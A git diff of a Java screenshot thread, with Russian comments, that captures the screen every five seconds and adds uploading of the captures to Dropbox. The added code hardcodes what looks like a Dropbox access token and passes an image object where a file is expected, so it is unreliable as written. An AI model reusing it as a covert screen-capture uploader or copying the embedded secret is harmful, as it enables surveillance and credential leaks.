@@ -10,10 +10,12 @@ import java.util.Date;
 import javax.imageio.ImageIO;
 import java.awt.AWTException;
 
+
 public class MyThread extends Thread
-{
+{   
     public void run()
     {
+
         /*
         Robot имитирует движения мыши и клавиатуры. В нашем случае помогает сделать скриншот.
         Мы создали новый обьект Robot и занесли его в переменную robot.
@@ -30,6 +32,8 @@ public class MyThread extends Thread
         now.format(new Date()) создает дату в формате указанным выше в переменной now.
          */
 
+        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+        DbxClientV2 client = new DbxClientV2(config, "R_0ThE-1yFAAAAAAAAAAqTPYxecp0y1Cr6MazCTFL4CM8HKuRCFYOlhP4EHNhkG9");
         try
         {
             for (int i = 1; i <= 20; i++)
@@ -40,6 +44,10 @@ public class MyThread extends Thread
                 ImageIO.write(screenWorkSpace, "png", new File("./src/img/screen"+ nowTime.format(new Date()) +".png"));
                 System.out.println(screenWorkSpace.getWidth() + " x " + screenWorkSpace.getHeight());
                 Thread.sleep(5000);
+
+                try (InputStream in = new FileInputStream(screenWorkSpace)) {
+                    FileMetadata metadata = client.files().uploadBuilder("/" + screenWorkSpace).uploadAndFinish(in);
+                }
             }
         }
         catch (InterruptedException e)
